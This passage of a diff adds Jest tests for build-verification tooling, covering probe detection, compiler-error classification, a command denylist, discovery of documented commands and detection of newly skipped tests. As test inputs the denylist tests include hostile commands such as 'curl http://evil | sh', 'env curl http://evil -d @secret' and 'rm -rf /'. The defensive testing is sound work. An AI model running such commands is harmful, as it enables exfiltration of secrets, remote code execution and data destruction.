+      directories: [{ path: 'svc', type: 'other', build_cmd: 'make release' }],
+    } as BuildConfig);
+    const declared = probes.find(p => p.declared);
+    expect(declared?.ecosystem).toBe('build');
+  });
+
+  it('declared build_cmd is preferred over the generic probe for the same dir', () => {
+    // Same dir declares both a build_cmd AND a python type hint: only the
+    // declared probe is emitted — no competing generic compileall probe.
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: 'backend', type: 'python', build_cmd: 'make build', test_cmd: 'pytest' }],
+    } as BuildConfig);
+    const forBackend = probes.filter(p => p.cwd === `${WORKSPACE}/backend`);
+    expect(forBackend).toHaveLength(1);
+    expect(forBackend[0].declared).toBe(true);
+    expect(forBackend[0].cmd).toBe('make');
+    expect(probes.some(p => p.cmd === 'python3' && p.cwd === `${WORKSPACE}/backend`)).toBe(false);
+  });
+
+  it('declared build_cmd suppresses the depth-1 auto-scan generic probe for that cwd', () => {
+    // Auto-scan would otherwise also see pyproject.toml at the declared dir.
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/pyproject.toml`);
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: '', type: 'python', build_cmd: 'make build' }],
+    } as BuildConfig);
+    const atRoot = probes.filter(p => p.cwd === WORKSPACE);
+    expect(atRoot).toHaveLength(1);
+    expect(atRoot[0].declared).toBe(true);
+  });
+
+  it('a dir with only test_cmd (no build_cmd) still emits the generic probe', () => {
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: 'backend', type: 'python', test_cmd: 'pytest' }],
+    } as BuildConfig);
+    expect(probes.some(p => p.declared)).toBe(false);
+    expect(probes.find(p => p.ecosystem === 'python')?.cmd).toBe('python3');
+  });
+
+  it('empty/whitespace build_cmd is ignored (no declared probe)', () => {
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: 'backend', type: 'python', build_cmd: '   ', test_cmd: 'pytest' }],
+    } as BuildConfig);
+    expect(probes.some(p => p.declared)).toBe(false);
+  });
+});
+
+// ── classifyProbeOutcome ─────────────────────────────────────────────────────
+describe('classifyProbeOutcome', () => {
+  it('null error (exit 0) → pass', () => {
+    expect(classifyProbeOutcome('', null)).toBe('pass');
+  });
+
+  it('clean python SyntaxError → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('  File "x.py", line 2\nSyntaxError: invalid syntax', err)).toBe('fail');
+  });
+
+  it('tsc type error (error TS2322) → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 2 });
+    expect(classifyProbeOutcome("src/a.ts(3,5): error TS2322: Type 'number' is not assignable to type 'string'.", err)).toBe('fail');
+  });
+
+  it('rustc error[E0425] → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 101 });
+    expect(classifyProbeOutcome('error[E0425]: cannot find value `x` in this scope', err)).toBe('fail');
+  });
+
+  it('go build "undefined: Foo" → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('./main.go:5:2: undefined: Foo', err)).toBe('fail');
+  });
+
+  it('C# compile error (error CS0103) → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome("Program.cs(5,9): error CS0103: The name 'foo' does not exist in the current context", err)).toBe('fail');
+  });
+
+  it('.NET missing toolchain (dotnet not installed) → could_not_run, not a hard block', () => {
+    const err = Object.assign(new Error('failed'), { status: 127 });
+    expect(classifyProbeOutcome('dotnet: command not found', err)).toBe('could_not_run');
+  });
+
+  it('Maven compile error (COMPILATION ERROR) → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('[ERROR] COMPILATION ERROR :\n[ERROR] /src/Foo.java:[5,1] cannot find symbol', err)).toBe('fail');
+  });
+
+  it('Gradle compile error (Compilation failed) → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome("> Task :compileJava FAILED\nCompilation failed; see the compiler error output for details.", err)).toBe('fail');
+  });
+
+  it('Elixir compile error (** (CompileError)) → fail', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('** (CompileError) lib/foo.ex:5: undefined function bar/0', err)).toBe('fail');
+  });
+
+  it('Maven offline missing deps → conservative could_not_run (fall open, not a hard block)', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('[ERROR] Cannot access central in offline mode and the artifact has not been downloaded', err)).toBe('could_not_run');
+  });
+
+  it('Gradle missing toolchain (gradlew absent) → could_not_run', () => {
+    const err = Object.assign(new Error('spawn ./gradlew ENOENT'), { code: 'ENOENT' });
+    expect(classifyProbeOutcome('', err)).toBe('could_not_run');
+  });
+
+  it('spawn ENOENT (missing tool) → could_not_run', () => {
+    const err = Object.assign(new Error('spawn python3 ENOENT'), { code: 'ENOENT' });
+    expect(classifyProbeOutcome('', err)).toBe('could_not_run');
+  });
+
+  it('ETIMEDOUT → could_not_run', () => {
+    const err = Object.assign(new Error('timed out'), { code: 'ETIMEDOUT' });
+    expect(classifyProbeOutcome('', err)).toBe('could_not_run');
+  });
+
+  it('python ModuleNotFoundError (missing dep) → could_not_run', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome("ModuleNotFoundError: No module named 'numpy'", err)).toBe('could_not_run');
+  });
+
+  it('tsc "Cannot find module" (TS2307, missing deps) → could_not_run, not a hard block', () => {
+    const err = Object.assign(new Error('failed'), { status: 2 });
+    expect(classifyProbeOutcome("src/a.ts(1,20): error TS2307: Cannot find module 'react'.", err)).toBe('could_not_run');
+  });
+
+  it('go missing module → could_not_run', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('main.go:3:8: no required module provides package example.com/x', err)).toBe('could_not_run');
+  });
+
+  it('unrecognized non-zero exit → conservative could_not_run', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('some unexpected error blob', err)).toBe('could_not_run');
+  });
+
+  // ── declared-aware classification ──────────────────────────────────────────
+  it('declared + unrecognized non-zero exit → fail (operator build is authoritative)', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('webpack build error: chunk too large', err, true)).toBe('fail');
+  });
+
+  it('declared + missing-tool signature → still could_not_run (must fall open)', () => {
+    const err = Object.assign(new Error('failed'), { status: 127 });
+    expect(classifyProbeOutcome('bash: make: command not found', err, true)).toBe('could_not_run');
+  });
+
+  it('declared + missing-dependency signature → still could_not_run (must fall open)', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome("Error: Cannot find module 'webpack'", err, true)).toBe('could_not_run');
+  });
+
+  it('declared + spawn ENOENT → still could_not_run', () => {
+    const err = Object.assign(new Error('spawn make ENOENT'), { code: 'ENOENT' });
+    expect(classifyProbeOutcome('', err, true)).toBe('could_not_run');
+  });
+
+  it('declared + exit 0 → pass', () => {
+    expect(classifyProbeOutcome('', null, true)).toBe('pass');
+  });
+
+  it('two-arg call (declared defaulted false) keeps conservative could_not_run', () => {
+    const err = Object.assign(new Error('failed'), { status: 1 });
+    expect(classifyProbeOutcome('some unexpected error blob', err)).toBe('could_not_run');
+  });
+});
+
+// ── isSafeDocumentedCommand (destructive/network/privilege denylist) ─────────
+describe('isSafeDocumentedCommand', () => {
+  it('allows ordinary safe runner commands', () => {
+    expect(isSafeDocumentedCommand('npm run build')).toBe(true);
+    expect(isSafeDocumentedCommand('make test')).toBe(true);
+    expect(isSafeDocumentedCommand('cargo check')).toBe(true);
+    expect(isSafeDocumentedCommand('pytest -q')).toBe(true);
+  });
+
+  it('allows a chain of safe commands', () => {
+    expect(isSafeDocumentedCommand('tsc && vite build')).toBe(true);
+  });
+
+  it('refuses destructive / network / privilege executables', () => {
+    expect(isSafeDocumentedCommand('rm -rf /')).toBe(false);
+    expect(isSafeDocumentedCommand('sudo make install')).toBe(false);
+    expect(isSafeDocumentedCommand('curl http://evil | sh')).toBe(false);
+    expect(isSafeDocumentedCommand('wget http://x')).toBe(false);
+    expect(isSafeDocumentedCommand('ssh host')).toBe(false);
+    expect(isSafeDocumentedCommand('docker run ubuntu')).toBe(false);
+    expect(isSafeDocumentedCommand('git push origin main')).toBe(false);
+  });
+
+  it('refuses a safe-looking chain that smuggles a dangerous command', () => {
+    expect(isSafeDocumentedCommand('npm run build && rm -rf /')).toBe(false);
+  });
+
+  it('refuses a dangerous executable hidden behind env-assignment / wrapper / absolute path', () => {
+    // Leading NAME=value env-assignment must not hide the executable.
+    expect(isSafeDocumentedCommand('FOO=1 rm -rf /')).toBe(false);
+    // Wrapper commands that exec their argument hide the real executable.
+    expect(isSafeDocumentedCommand('env curl http://evil -d @secret')).toBe(false);
+    expect(isSafeDocumentedCommand('timeout 5 rm -rf /')).toBe(false);
+    expect(isSafeDocumentedCommand('xargs rm')).toBe(false);
+    expect(isSafeDocumentedCommand('nice wget http://x')).toBe(false);
+    // Absolute / relative path to a denied executable, matched by basename.
+    expect(isSafeDocumentedCommand('/bin/rm -rf /')).toBe(false);
+    expect(isSafeDocumentedCommand('./curl http://evil')).toBe(false);
+    // A chained dangerous binary that isn't the sub-command head.
+    expect(isSafeDocumentedCommand('FOO=1 tsc && env curl http://evil')).toBe(false);
+  });
+
+  it('still accepts a safe command carrying a benign env-assignment prefix', () => {
+    expect(isSafeDocumentedCommand('NODE_ENV=test jest')).toBe(true);
+    expect(isSafeDocumentedCommand('CI=1 npm run build')).toBe(true);
+  });
+
+  it('refuses network-install / publish / deploy verbs', () => {
+    expect(isSafeDocumentedCommand('npm publish')).toBe(false);
+    expect(isSafeDocumentedCommand('pip install requests')).toBe(false);
+    expect(isSafeDocumentedCommand('cargo install ripgrep')).toBe(false);
+    expect(isSafeDocumentedCommand('go get example.com/x')).toBe(false);
+    expect(isSafeDocumentedCommand('npm run deploy')).toBe(false);
+  });
+
+  it('refuses command substitution, inline eval, and redirection to system paths', () => {
+    expect(isSafeDocumentedCommand('echo `whoami`')).toBe(false);
+    expect(isSafeDocumentedCommand('node -e "process.exit(1)"')).toBe(false);
+    expect(isSafeDocumentedCommand('python3 -c "import os"')).toBe(false);
+    expect(isSafeDocumentedCommand('make build > /etc/passwd')).toBe(false);
+  });
+
+  it('refuses empty / blank commands', () => {
+    expect(isSafeDocumentedCommand('')).toBe(false);
+    expect(isSafeDocumentedCommand('   ')).toBe(false);
+  });
+});
+
+// ── isAllowlistedRunnerShape (free-text README first-token allowlist) ─────────
+describe('isAllowlistedRunnerShape', () => {
+  it('accepts known-safe runner first tokens', () => {
+    expect(isAllowlistedRunnerShape('npm test')).toBe(true);
+    expect(isAllowlistedRunnerShape('make build')).toBe(true);
+    expect(isAllowlistedRunnerShape('pytest')).toBe(true);
+  });
+
+  it('rejects unknown / dangerous first tokens', () => {
+    expect(isAllowlistedRunnerShape('rm -rf /')).toBe(false);
+    expect(isAllowlistedRunnerShape('./deploy.sh')).toBe(false);
+    expect(isAllowlistedRunnerShape('')).toBe(false);
+  });
+});
+
+// ── discoverDocumentedCommands (diff-aware structured + prose discovery) ──────
+describe('discoverDocumentedCommands', () => {
+  const WS = '/tmp/workspace';
+  // Build a readFile stub from a relPath→text map.
+  const reader = (files: Record<string, string>) =>
+    (rel: string): string | null => (rel in files ? files[rel] : null);
+
+  it('discovers a newly added package.json build script', () => {
+    const pkg = JSON.stringify({ scripts: { build: 'tsc -p .' } });
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['agent/package.json'],
+      addedLines: ['"build": "tsc -p ."'],
+      readFile: reader({ 'agent/package.json': pkg }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(1);
+    expect(cmds[0].command).toBe('npm run build');
+    expect(cmds[0].cwd).toBe(`${WS}/agent`);
+    expect(cmds[0].heavy).toBe(true);
+    expect(cmds[0].source).toBe('package.json scripts.build');
+  });
+
+  it('ignores a package.json script that was NOT added in the diff', () => {
+    const pkg = JSON.stringify({ scripts: { build: 'tsc -p .' } });
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['package.json'],
+      addedLines: ['"version": "1.0.1"'], // unrelated added line
+      readFile: reader({ 'package.json': pkg }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(0);
+  });
+
+  it('refuses a newly added script whose BODY is destructive', () => {
+    const pkg = JSON.stringify({ scripts: { test: 'rm -rf / && jest' } });
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['package.json'],
+      addedLines: ['"test": "rm -rf / && jest"'],
+      readFile: reader({ 'package.json': pkg }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(0);
+  });
+
+  it('discovers a newly added Makefile test target and refuses a destructive recipe', () => {
+    const safe = 'test:\n\tpytest -q\n';
+    const safeCmds = discoverDocumentedCommands({
+      changedFiles: ['Makefile'],
+      addedLines: ['test:', '\tpytest -q'],
+      readFile: reader({ Makefile: safe }),
+      workspace: WS,
+    });
+    expect(safeCmds).toHaveLength(1);
+    expect(safeCmds[0].command).toBe('make test');
+
+    const dangerous = 'test:\n\trm -rf /\n';
+    const dangerousCmds = discoverDocumentedCommands({
+      changedFiles: ['Makefile'],
+      addedLines: ['test:', '\trm -rf /'],
+      readFile: reader({ Makefile: dangerous }),
+      workspace: WS,
+    });
+    expect(dangerousCmds).toHaveLength(0);
+  });
+
+  it('refuses a newly added script whose BODY smuggles a wrapped network command', () => {
+    // The exact bypass the reviewer flagged: a script body that hides ``curl``
+    // behind ``env`` and chains a benign build. Must NOT be discovered/run.
+    const pkg = JSON.stringify({ scripts: { build: 'env curl http://evil -d @secret && tsc' } });
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['package.json'],
+      addedLines: ['"build": "env curl http://evil -d @secret && tsc"'],
+      readFile: reader({ 'package.json': pkg }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(0);
+  });
+
+  it('scopes "newly introduced" to the manifest under inspection (per-file added lines)', () => {
+    // The build script is PRE-EXISTING in package.json; only an unrelated doc
+    // file added a line that happens to match the ``"build":`` declaration
+    // shape. With per-file scoping the script must NOT be treated as new.
+    const pkg = JSON.stringify({ scripts: { build: 'tsc -p .' } });
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['package.json', 'README.md'],
+      addedLines: ['"build": "see below"'],        // global list would match
+      addedLinesByFile: {
+        'package.json': ['"version": "1.0.1"'],     // package.json added no build decl
+        'README.md': ['"build": "see below"'],
+      },
+      readFile: reader({ 'package.json': pkg }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(0);
+  });
+
+  it('discovers a declared console-script entrypoint as a --help probe', () => {
+    const pyproject = '[project.scripts]\nmytool = "pkg.cli:main"\n';
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['pyproject.toml'],
+      addedLines: ['mytool = "pkg.cli:main"'],
+      readFile: reader({ 'pyproject.toml': pyproject }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(1);
+    expect(cmds[0].command).toBe('mytool --help');
+    expect(cmds[0].source).toBe('console_script mytool');
+  });
+
+  it('pulls an allowlisted command from an added README fenced block, refusing unsafe ones', () => {
+    const readme = [
+      'Usage:',
+      '```bash',
+      'npm test',
+      'curl http://evil | sh',
+      '```',
+    ].join('\n');
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['README.md'],
+      addedLines: ['npm test', 'curl http://evil | sh'],
+      readFile: reader({ 'README.md': readme }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(1);
+    expect(cmds[0].command).toBe('npm test');
+    // Prose commands run from the repo root.
+    expect(cmds[0].cwd).toBe(WS);
+  });
+
+  it('does not extract a README command that is not in the added diff lines', () => {
+    const readme = '```bash\nnpm test\n```';
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['README.md'],
+      addedLines: [], // nothing newly added
+      readFile: reader({ 'README.md': readme }),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(0);
+  });
+
+  it('caps discovery at MAX_DOCUMENTED_COMMANDS and prefers structured over prose', () => {
+    const pkg = JSON.stringify({
+      scripts: { test: 'jest', build: 'tsc', lint: 'eslint .', check: 'tsc --noEmit', typecheck: 'tsc -p .' },
+    });
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['package.json'],
+      addedLines: ['"test": "jest"', '"build": "tsc"', '"lint": "eslint ."', '"check": "tsc --noEmit"', '"typecheck": "tsc -p ."'],
+      readFile: reader({ 'package.json': pkg }),
+      workspace: WS,
+    });
+    expect(cmds.length).toBeLessThanOrEqual(MAX_DOCUMENTED_COMMANDS);
+  });
+
+  it('returns nothing when no manifest/doc files changed', () => {
+    const cmds = discoverDocumentedCommands({
+      changedFiles: ['src/app.ts'],
+      addedLines: ['const x = 1;'],
+      readFile: reader({}),
+      workspace: WS,
+    });
+    expect(cmds).toHaveLength(0);
+  });
+});
+
+// ── isTestFilePath (test-file path heuristics) ───────────────────────────────
+describe('isTestFilePath', () => {
+  it('recognizes the common per-ecosystem test-file conventions', () => {
+    expect(isTestFilePath('src/foo.test.ts')).toBe(true);
+    expect(isTestFilePath('src/foo.spec.tsx')).toBe(true);
+    expect(isTestFilePath('pkg/server_test.go')).toBe(true);
+    expect(isTestFilePath('backend/test_thing.py')).toBe(true);
+    expect(isTestFilePath('backend/thing_test.py')).toBe(true);
+    expect(isTestFilePath('spec/models/user_spec.rb')).toBe(true);
+    expect(isTestFilePath('app/tests/helpers.py')).toBe(true);
+    expect(isTestFilePath('app/__tests__/util.js')).toBe(true);
+  });
+
+  it('rejects non-test source/prose paths', () => {
+    expect(isTestFilePath('src/app.ts')).toBe(false);
+    expect(isTestFilePath('README.md')).toBe(false);
+    expect(isTestFilePath('backend/app/models.py')).toBe(false);
+    expect(isTestFilePath('docs/testing.md')).toBe(false); // mentions "test" in prose, not a test file
+    expect(isTestFilePath('')).toBe(false);
+  });
+});
+
+// ── discoverNewlyDisabledTests (diff-aware newly-introduced skip markers) ─────
+describe('discoverNewlyDisabledTests', () => {
+  it('detects a newly added JS/TS it.skip in a test file', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['src/foo.test.ts'],
+      addedLinesByFile: { 'src/foo.test.ts': ['it.skip("flaky", () => {', '  expect(1).toBe(1);'] },
+    });
+    expect(markers).toHaveLength(1);
+    expect(markers[0].file).toBe('src/foo.test.ts');
+    expect(markers[0].marker).toBe('it.skip');
+    expect(markers[0].line).toBe('it.skip("flaky", () => {');
+  });
+
+  it('detects xit / xdescribe / describe.skip / test.skip variants', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['a.test.js', 'b.spec.ts'],
+      addedLinesByFile: {
+        'a.test.js': ['xit("x", () => {})', 'xdescribe("grp", () => {})'],
+        'b.spec.ts': ['describe.skip("d", () => {})', 'test.skip("t", () => {})'],
+      },
+    });
+    expect(markers.map(m => m.marker).sort()).toEqual(
+      ['describe.skip', 'test.skip', 'xdescribe', 'xit'],
+    );
+  });
+
+  it('detects Python pytest markers and unittest decorators, keeping skip vs skipif distinct', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['test_mod.py'],
+      addedLinesByFile: {
+        'test_mod.py': [
+          '@pytest.mark.skip(reason="broken")',
+          '@pytest.mark.skipif(sys.platform == "win32", reason="x")',
+          '@pytest.mark.xfail',
+          '@unittest.skip("later")',
+        ],
+      },
+    });
+    expect(markers.map(m => m.marker)).toEqual([
+      '@pytest.mark.skip',
+      '@pytest.mark.skipif',
+      '@pytest.mark.xfail',
+      '@unittest.skip',
+    ]);
+  });
+
+  it('detects Go t.Skip(, Rust #[ignore], and JUnit @Disabled/@Ignore', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['svc_test.go', 'lib/tests/mod.rs', 'src/test/java/AppTest.java'],
+      addedLinesByFile: {
+        'svc_test.go': ['\tt.Skip("not yet")'],
+        'lib/tests/mod.rs': ['#[ignore]'],
+        'src/test/java/AppTest.java': ['@Disabled', '@Ignore'],
+      },
+    });
+    expect(markers.map(m => m.marker).sort()).toEqual(
+      ['#[ignore]', '@Disabled', '@Ignore', 't.Skip()'],
+    );
+  });
+
+  it('only counts the PR\'s OWN added lines — a pre-existing skip (no added entry) is ignored', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['src/foo.test.ts'],
+      // The file changed but the skip line is pre-existing (not in added lines).
+      addedLinesByFile: { 'src/foo.test.ts': ['const x = 2;'] },
+    });
+    expect(markers).toHaveLength(0);
+  });
+
+  it('ignores skip markers added to NON-test files (path heuristic guards prose/source)', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['src/app.ts', 'README.md'],
+      addedLinesByFile: {
+        'src/app.ts': ['const describe = { skip: true };'], // not a test file
+        'README.md': ['Use it.skip to skip a test'],        // prose, not a test file
+      },
+    });
+    expect(markers).toHaveLength(0);
+  });
+
+  it('does not false-positive on commented-out marker mentions in a test file', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['foo.test.ts', 'test_x.py'],
+      addedLinesByFile: {
+        'foo.test.ts': ['// it.skip is deprecated, do not use', '* describe.skip example'],
+        'test_x.py': ['# @pytest.mark.skip is discouraged here'],
+      },
+    });
+    expect(markers).toHaveLength(0);
+  });
+
+  it('still detects a Rust #[ignore] attribute (not treated as a comment despite leading #)', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['lib/tests/mod.rs'],
+      addedLinesByFile: { 'lib/tests/mod.rs': ['#[ignore = "slow"]'] },
+    });
+    expect(markers).toHaveLength(1);
+    expect(markers[0].marker).toBe('#[ignore]');
+  });
+
+  it('caps reported markers at MAX_DISABLED_TEST_MARKERS', () => {
+    const many = Array.from({ length: MAX_DISABLED_TEST_MARKERS + 5 }, (_, i) => `it.skip("t${i}", () => {})`);
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['big.test.ts'],
+      addedLinesByFile: { 'big.test.ts': many },
+    });
+    expect(markers).toHaveLength(MAX_DISABLED_TEST_MARKERS);
+  });
+
+  it('returns nothing when no test files changed', () => {
+    const markers = discoverNewlyDisabledTests({
+      changedFiles: ['src/app.ts'],
+      addedLinesByFile: { 'src/app.ts': ['it.skip("x")'] },
+    });
+    expect(markers).toHaveLength(0);
   });
 });
